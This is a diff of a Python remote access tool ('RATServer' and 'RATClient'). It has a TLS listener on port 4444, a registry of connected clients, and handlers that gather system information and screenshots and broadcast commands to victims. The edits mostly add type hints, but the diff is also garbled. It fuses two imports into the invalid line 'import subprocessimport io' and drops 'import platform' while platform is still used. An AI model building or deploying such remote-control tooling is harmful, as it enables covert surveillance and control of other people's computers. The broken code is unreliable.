@@ -15,9 +15,10 @@ import os
 import sys
 import time
 import base64
-import subprocess
-import platform
+import subprocessimport io
 from datetime import datetime
+from typing import Dict, List, Optional, Any
+
 
 class RATServer:
     def __init__(self, host='0.0.0.0', port=4444, certfile='server.crt', keyfile='server.key'):
@@ -27,10 +28,10 @@ class RATServer:
         self.keyfile = keyfile
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         self.context.load_cert_chain(certfile, keyfile)
-        self.clients = {}
-        self.sessions = []
-        self.running = False
+        self.clients = {}  # client_id -> {socket, addr, connected, timestamp}
+        self.sessions = []  # list of session records
         self.lock = threading.Lock()
+        self.running = False
 
     def start(self):
         self.running = True
@@ -49,7 +50,7 @@ class RATServer:
                     self.clients[client_id] = {
                         'socket': ssl_socket,
                         'addr': addr,
-                        'connected': datetime.utcnow().isoformat()
+                        'connected': datetime.utcnow().isoformat(),
                     }
                 print(f"[RAT] Client connected: {client_id}")
                 handler = threading.Thread(target=self._handle_client, args=(client_id, ssl_socket))
@@ -61,7 +62,7 @@ class RATServer:
 
         server_socket.close()
 
-    def _handle_client(self, client_id, ssl_socket):
+    def _handle_client(self, client_id: str, ssl_socket: socket.socket):
         buffer = b''
         while self.running:
             try:
@@ -82,7 +83,7 @@ class RATServer:
             self.clients.pop(client_id, None)
         print(f"[RAT] Client disconnected: {client_id}")
 
-    def _process_command(self, client_id, ssl_socket, command):
+    def _process_command(self, client_id: str, ssl_socket: socket.socket, command: str):
         result = {'client': client_id, 'command': command, 'timestamp': datetime.utcnow().isoformat()}
         try:
             cmd = json.loads(command)
@@ -97,7 +98,7 @@ class RATServer:
                     'version': platform.version(),
                     'hostname': platform.node(),
                     'arch': platform.machine(),
-                    'python': platform.python_version()
+                    'python': platform.python_version(),
                 }
             elif action == 'screenshot':
                 try:
@@ -140,7 +141,7 @@ class RATServer:
         except Exception:
             pass
 
-    def broadcast(self, command_dict):
+    def broadcast(self, command_dict: Dict[str, Any]):
         payload = (json.dumps(command_dict) + '\n').encode()
         with self.lock:
             for client_id, info in list(self.clients.items()):
@@ -172,7 +173,7 @@ class RATServer:
 
 
 class RATClient:
-    def __init__(self, server_host, server_port, certfile='server.crt'):
+    def __init__(self, server_host: str, server_port: int, certfile='server.crt'):
         self.server_host = server_host
         self.server_port = server_port
         self.certfile = certfile
@@ -188,7 +189,7 @@ class RATClient:
         self.running = True
         print(f"[RAT] Connected to {self.server_host}:{self.server_port}")
 
-    def send_command(self, action, **kwargs):
+    def send_command(self, action: str, **kwargs):
         payload = {'action': action}
         payload.update(kwargs)
         self.socket.sendall((json.dumps(payload) + '\n').encode())
